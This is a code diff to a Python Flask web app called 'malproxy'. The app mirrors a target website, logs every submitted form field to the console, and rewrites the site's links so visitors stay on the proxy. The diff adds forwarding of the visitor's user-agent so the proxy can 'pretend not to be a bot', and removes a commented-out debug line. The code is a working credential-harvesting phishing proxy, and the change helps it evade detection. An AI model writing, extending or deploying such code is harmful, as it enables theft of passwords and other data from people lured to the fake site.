@@ -15,6 +15,8 @@ def malproxy(path):
     # A link variable which contains the scheme in addition to the netloc
     global link
     parsed = urlparse(WEBSITE)
+    # The internet relies on trust, but for these purposes we'll pretend not to be a bot
+    uaHeader = request.headers.get('user-agent')
     link = WEBSITE
     if(not parsed.scheme):
         link = f'https://{WEBSITE}'
@@ -22,7 +24,7 @@ def malproxy(path):
     if(request.method == 'POST'):
         for key in request.form:
             print(f'{key}: {request.form[key]}')
-    r = requests.request(request.method, f'{link}{path}')
+    r = requests.request(request.method, f'{link}{path}', headers={'user-agent':uaHeader})
     contentType = r.headers.get('Content-Type')
     # In case of html text, replace all the links
     if('text/html' in contentType):
@@ -32,10 +34,11 @@ def malproxy(path):
 # If the user accesses any paths at the same netloc, we want to continue proxying
 @app.route('/<path:path>', methods=['POST', 'GET'])
 def proxycont(path):
+    uaHeader = request.headers.get('user-agent')
     if(request.method == 'POST'):
         for key in request.form:
             print(f'{key}: {request.form[key]}')
-    r = requests.request(request.method, f'{link}/{path}')
+    r = requests.request(request.method, f'{link}/{path}', headers={'user-agent':uaHeader})
     contentType = r.headers.get('Content-Type')
     if('text/html' in contentType):
         return replaceurls(r.text)
@@ -57,7 +60,6 @@ def replaceurls(text):
                 continue
             strippedLink = rawLink.strip('"')
             someURL = urlparse(strippedLink)
-            # print(someURL.netloc, WEBSITE)
             if(someURL.netloc == WEBSITE or someURL.netloc == f'www.{WEBSITE}'):
                 indexPair = m.span()
                 myurl = request.url
